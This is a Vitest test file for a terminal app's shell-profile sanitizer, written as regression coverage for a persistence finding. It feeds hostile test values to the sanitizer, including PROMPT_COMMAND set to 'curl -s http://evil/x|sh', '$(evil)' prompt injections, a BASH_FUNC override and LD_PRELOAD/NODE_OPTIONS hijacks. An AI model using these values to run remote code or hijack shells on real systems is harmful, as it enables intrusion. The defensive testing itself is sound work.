import { describe, expect, it } from 'vitest'
import {
  describeProfile,
  newlyExecutable,
  sanitizeProfile,
  sanitizeProfiles
} from '../src/main/shellProfileGuard'
import type { ShellProfile } from '../src/shared/types'

/**
 * Regression guard for a confirmed MEDIUM finding: `settings:set` accepted
 * `terminal.customProfiles` with an arbitrary path/args, and `pty:spawn` then
 * executed it — turning a renderer compromise into persistence that survives
 * restart. Structural validation lives here; the execution-changing case is
 * additionally gated by a confirmation dialog in ipc.ts.
 */
const win = process.platform === 'win32'
const ABS = win ? 'C:\\Windows\\System32\\cmd.exe' : '/bin/bash'
const yes = (): boolean => true
const no = (): boolean => false

const profile = (over: Record<string, unknown> = {}): unknown => ({
  id: 'custom',
  name: 'Мой shell',
  path: ABS,
  args: [],
  integration: 'none',
  icon: '›',
  ...over
})

describe('sanitizeProfile', () => {
  it('accepts an ordinary absolute-path profile', () => {
    const p = sanitizeProfile(profile(), yes)
    expect(p?.path).toBe(ABS)
    expect(p?.args).toEqual([])
  })

  it('rejects a bare program name — it would resolve via PATH or the child cwd', () => {
    expect(sanitizeProfile(profile({ path: 'cmd.exe' }), yes)).toBeNull()
    expect(sanitizeProfile(profile({ path: 'bash' }), yes)).toBeNull()
    expect(sanitizeProfile(profile({ path: './evil.exe' }), yes)).toBeNull()
    expect(sanitizeProfile(profile({ path: '../../evil' }), yes)).toBeNull()
  })

  it('rejects a path that does not exist', () => {
    expect(sanitizeProfile(profile(), no)).toBeNull()
  })

  it('rejects control characters and NUL anywhere they could truncate', () => {
    expect(sanitizeProfile(profile({ path: `${ABS}\u0000.txt` }), yes)).toBeNull()
    expect(sanitizeProfile(profile({ name: 'ok\nfake' }), yes)).toBeNull()
    expect(sanitizeProfile(profile({ args: ['--x\u0000y'] }), yes)).toBeNull()
  })

  it('drops environment variables that make a trusted binary run untrusted code', () => {
    const p = sanitizeProfile(
      profile({
        env: {
          // loader family
          LD_PRELOAD: '/tmp/evil.so',
          DYLD_INSERT_LIBRARIES: '/tmp/evil.dylib',
          NODE_OPTIONS: '--require /tmp/evil.js',
          ELECTRON_RUN_AS_NODE: '1',
          // shell family — the ones a deny list keeps forgetting. Our own
          // integration.bash appends to PROMPT_COMMAND and PS0, so an inherited
          // value is executed by the very script we install.
          PROMPT_COMMAND: 'curl -s http://evil/x|sh',
          PS0: '$(evil)',
          PS1: '$(evil)',
          'BASH_FUNC_ls%%': '() { evil; }',
          BASH_ENV: '/tmp/evil.sh',
          SHELLOPTS: 'xtrace',
          // integration scripts source $HOME/.bashrc and $HOME/.zshrc themselves
          HOME: '/tmp/evil',
          USERPROFILE: 'C:\\tmp\\evil',
          PSModulePath: 'C:\\tmp\\modules',
          GIT_SSH_COMMAND: 'evil',
          PYTHONPATH: '/tmp/evil',
          PAGER: 'evil',
          PATH: '/tmp/evil:/usr/bin',
          // the only kind a profile legitimately needs
          LANG: 'ru_RU.UTF-8'
        }
      }),
      yes
    )
    expect(p).not.toBeNull()
    expect(p?.env).toEqual({ LANG: 'ru_RU.UTF-8' })
  })

  it('keeps locale/proxy variables — the allow list is not "no env at all"', () => {
    const p = sanitizeProfile(
      profile({ env: { LC_ALL: 'C', TZ: 'Europe/Moscow', HTTPS_PROXY: 'http://p:3128' } }),
      yes
    )
    expect(p?.env).toEqual({ LC_ALL: 'C', TZ: 'Europe/Moscow', HTTPS_PROXY: 'http://p:3128' })
  })

  it('never lets a stored profile claim it was auto-detected', () => {
    expect(sanitizeProfile(profile({ detected: true }), yes)?.detected).toBe(false)
  })

  it('falls back to a safe integration kind instead of trusting the input', () => {
    expect(sanitizeProfile(profile({ integration: 'evil' }), yes)?.integration).toBe('none')
  })

  it('rejects junk shapes outright', () => {
    for (const junk of [null, undefined, 42, 'str', [], { id: 'x' }])
      expect(sanitizeProfile(junk, yes)).toBeNull()
    expect(sanitizeProfile(profile({ args: 'not-an-array' }), yes)).toBeNull()
    expect(sanitizeProfile(profile({ env: ['nope'] }), yes)).toBeNull()
  })

  it('caps unbounded growth', () => {
    expect(sanitizeProfile(profile({ args: Array(200).fill('-x') }), yes)).toBeNull()
    expect(sanitizeProfile(profile({ name: 'x'.repeat(5000) }), yes)).toBeNull()
  })
})

describe('sanitizeProfiles', () => {
  it('drops the bad entries and keeps the good ones', () => {
    const list = sanitizeProfiles([profile(), profile({ id: 'b', path: 'relative' })], yes)
    expect(list.map((p) => p.id)).toEqual(['custom'])
  })

  it('de-duplicates ids so one entry cannot shadow another', () => {
    const list = sanitizeProfiles([profile(), profile({ name: 'второй' })], yes)
    expect(list).toHaveLength(1)
  })

  it('returns an empty list for a non-array', () => {
    expect(sanitizeProfiles('nope', yes)).toEqual([])
    expect(sanitizeProfiles(null, yes)).toEqual([])
  })
})

describe('newlyExecutable', () => {
  const base = sanitizeProfile(profile(), yes) as ShellProfile

  it('flags a brand-new profile', () => {
    expect(newlyExecutable([], [base])).toHaveLength(1)
  })

  it('flags a changed path, argv, env or integration — each changes what runs', () => {
    expect(newlyExecutable([base], [{ ...base, path: `${ABS}.other` }])).toHaveLength(1)
    expect(newlyExecutable([base], [{ ...base, args: ['-c', 'evil'] }])).toHaveLength(1)
    expect(newlyExecutable([base], [{ ...base, env: { FOO: 'bar' } }])).toHaveLength(1)
    expect(newlyExecutable([base], [{ ...base, integration: 'bash' }])).toHaveLength(1)
  })

  it('does not nag for a rename or a new icon — nothing new executes', () => {
    expect(newlyExecutable([base], [{ ...base, name: 'Переименовал', icon: '★' }])).toHaveLength(0)
  })

  it('says nothing when the list is unchanged', () => {
    expect(newlyExecutable([base], [base])).toHaveLength(0)
  })
})

describe('describeProfile', () => {
  it('shows the path and argv the user is being asked to approve', () => {
    const p = sanitizeProfile(profile({ args: ['-c', 'whoami'] }), yes) as ShellProfile
    const text = describeProfile(p)
    expect(text).toContain(ABS)
    expect(text).toContain('-c whoami')
  })

  it('stays readable in a non-scrolling dialog, and never clips the path', () => {
    // 64 × 2 KB of argv would otherwise push the interesting tail hundreds of
    // wrapped lines past the screen edge, while line one still looks ordinary.
    const p = sanitizeProfile(
      profile({ name: 'x'.repeat(400), args: Array(60).fill('y'.repeat(2000)) }),
      yes
    ) as ShellProfile
    const text = describeProfile(p)
    expect(text.length).toBeLessThan(1000)
    expect(text).toContain(ABS)
  })

  it('shows environment VALUES, not just names', () => {
    // «окружение: LANG» tells the user nothing about what LANG is set to.
    const p = sanitizeProfile(profile({ env: { LANG: 'ru_RU.UTF-8' } }), yes) as ShellProfile
    expect(describeProfile(p)).toContain('ru_RU.UTF-8')
  })
})
